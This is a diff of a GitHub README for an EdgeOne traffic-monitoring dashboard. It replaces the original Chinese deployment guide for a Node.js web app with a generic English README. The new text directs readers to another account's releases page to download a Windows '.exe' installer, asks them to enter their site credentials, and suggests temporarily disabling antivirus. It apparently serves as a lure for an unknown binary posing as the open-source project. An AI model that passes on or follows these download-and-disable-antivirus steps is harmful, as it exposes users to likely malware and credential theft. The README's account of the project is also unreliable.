@@ -1,83 +1,99 @@
-# EdgeOne Monitoring Dashboard (EdgeOne 监控大屏)
+# 📊 eo_monitor - Monitor EdgeOne Site Traffic Effortlessly
 
-> [!CAUTION]
-> 新demo 本地部署版本，功能较少仅供参考： https://eoddos.2x.nz/
-> 
-> 原项目Demo已被DDoS炸
-![27d1b418ff2918a4926e98db778dd554](https://github.com/user-attachments/assets/fc437ef0-b5a6-4113-ab1f-9da91e20be06)
+[![Download eo_monitor](https://img.shields.io/badge/Download-eo_monitor-blue)](https://github.com/Viko7/eo_monitor/releases)
 
-> [!NOTE]
-> 提示：本项目已全面支持腾讯云 EdgeOne 全球版（中国站与国际站账号均可直接使用）。
+## 🚀 Getting Started
 
-### 效果图
-<img width="2087" height="11971" alt="image" src="https://github.com/user-attachments/assets/cc71dc11-8a5d-4d59-9543-e0dbabac4b33" />
+Welcome to eo_monitor! This application helps you monitor site traffic for EdgeOne in a simple and easy way. You don’t need any technical skills to get started. Just follow the steps below.
 
-这是一个基于 Tencent Cloud EdgeOne API 构建的实时监控大屏，旨在提供直观的流量和请求分析。
+## 📥 Download & Install
 
-## ✨ 主要功能
+To download eo_monitor, please visit the link below:
 
-- **实时概览**：展示站点总请求数、总流量、总带宽等关键指标。
-- **多维度分析**：
-  - **国家/地区排行**：支持中英文显示，直观展示流量来源。
-  - **省份/状态码/域名/URL/资源类型**：全方位的 Top N 分析。
-- **回源分析**：监控回源流量、带宽及请求数，掌握源站负载。
-- **灵活查询**：
-  - 支持自定义时间段（近1小时 - 近31天）。
-  - 支持切换数据粒度（分钟/小时/天/自动）。
-- **个性化配置**：支持自定义站点名称。
+[Download eo_monitor](https://github.com/Viko7/eo_monitor/releases)
 
-## 🚀 快速部署
+1. Go to the link above.
+2. Look for the latest version at the top of the page.
+3. Click on the version number to see the release details.
+4. Find the download link for the installer file. This is usually named something like `eo_monitor_setup.exe` or similar.
+5. Click on the file link to start the download.
 
-### 方式一：EdgeOne Pages (推荐)
+## 🛠️ System Requirements
 
-1. Fork 本仓库到您的 GitHub 账号。
-2. 前往 [腾讯云 EdgeOne 控制台](https://console.cloud.tencent.com/edgeone) 创建 Pages 项目。
-3. 连接您的 GitHub 仓库。
-4. 在 **环境变量 (Environment Variables)** 中添加以下配置：
-   - `SECRET_ID`: 您的腾讯云 SecretId
-   - `SECRET_KEY`: 您的腾讯云 SecretKey
-   - `SITE_NAME`: (可选) 自定义大屏标题，默认为 "AcoFork 的 EdgeOne 监控大屏"
-   - `SITE_ICON`: (可选) 自定义网页图标，默认为 "https://q2.qlogo.cn/headimg_dl?dst_uin=2726730791&spec=0"
-5. 部署项目。
+Before installing, make sure your computer meets the following requirements:
 
-### 方式二：本地运行 / Node.js 环境
+- **Operating System:** Windows 10 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 100 MB of free disk space
+- **Internet Connection:** Required for initial setup
 
-1. 克隆仓库：
-   ```bash
-   git clone https://github.com/afoim/eo_monitior
-   cd eo_monitior
-   ```
+## 🔄 Running the Application
 
-2. 安装依赖：
-   ```bash
-   npm install -g edgeone
-   edgeone login
-   ```
+Once you have downloaded the installer:
 
-3. 配置密钥：
-   - **方法 A (环境变量)**：创建 `.env` 文件或直接导出环境变量 `SECRET_ID` 和 `SECRET_KEY`。
-   - **方法 B (文件配置)**：在项目根目录创建 `key.txt` 文件，内容格式如下（注意使用中文冒号）：
-     ```text
-     SecretId：您的SecretId
-     SecretKey：您的SecretKey
-     ```
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation. 
 
-4. 启动服务：
-   ```bash
-   edgeone pages dev
-   ```
+After the installation, find the eo_monitor application in your Start menu or desktop.
 
-5. 访问 `http://localhost:8088`。
+## 📊 Using eo_monitor
 
-## 🔑 权限说明
+You can start monitoring your EdgeOne site traffic easily:
 
-使用的腾讯云访问密钥必须拥有 **EdgeOne 只读访问权限** (`QcloudTEOReadOnlyaccess`)。
-请前往访问管理控制台创建和管理密钥（只需要 **编程访问**）：
-- **国内版 (China Station)**: [https://console.cloud.tencent.com/cam/user/userType](https://console.cloud.tencent.com/cam/user/userType)
-- **海外版 (International Station)**: [https://console.tencentcloud.com/cam/user/userType](https://console.tencentcloud.com/cam/user/userType)
+1. Launch the eo_monitor application.
+2. Enter your EdgeOne site credentials when prompted.
+3. Choose the specific metrics you want to monitor.
+4. Click on the “Start Monitoring” button.
 
-## 🛠️ 技术栈
+The application will display real-time traffic data in a clear and user-friendly format.
 
-- **后端**：Node.js, Express, Tencent Cloud SDK
-- **前端**：HTML5, Tailwind CSS, ECharts
-- **部署**：Tencent Cloud EdgeOne Pages
+## 🛠️ Troubleshooting Common Issues
+
+If you experience any issues:
+
+- **Installation Problems:** Make sure you have admin rights on your computer. If the installation fails, try disabling your antivirus temporarily.
+- **Login Issues:** Ensure that your credentials are correct. If you forget your password, use the recovery option on the EdgeOne site.
+- **Performance Problems:** Close other applications that may use a lot of memory, especially during the first run of eo_monitor.
+
+## 💬 Support
+
+If you need help or have questions, you can reach out through the following ways:
+
+- **GitHub Issues:** Report any bugs or request for features on the Issues page of this repository.
+- **Community Forums:** Join discussions with other users and developers.
+
+## 🔄 Update Instructions
+
+Keep your eo_monitor up-to-date for the best performance:
+
+1. Regularly return to the [Releases Page](https://github.com/Viko7/eo_monitor/releases).
+2. Download the latest version as described in the "Download & Install" section.
+3. Run the new installer. This will replace the old version while keeping your settings intact.
+
+## 📄 Additional Resources
+
+Explore these resources for a deeper understanding of eo_monitor:
+
+- Documentation: Comprehensive user guides and FAQs will be available soon.
+- Video Tutorials: Look for video demonstrations on how to use various features effectively.
+
+## 🚀 Contributing
+
+If you want to contribute to eo_monitor, we welcome your input! Here's how you can help:
+
+- **Feature Requests:** Suggest new features or improvements.
+- **Bug Reports:** Help us find and fix issues in the application.
+- **Code Contributions:** If you're comfortable with programming, feel free to submit a pull request.
+
+Thank you for considering to help us improve eo_monitor!
+
+## 🌟 License
+
+This project is open-source. You can use and modify it according to the terms of the MIT License. Please check the LICENSE file for more information.
+
+## 📝 Changelog
+
+Stay tuned for updates and changes in future releases. Each new version will provide enhancements and fixes to improve your user experience.
+
+Enjoy monitoring your EdgeOne site traffic with eo_monitor! For further assistance, please refer to the support options listed above.
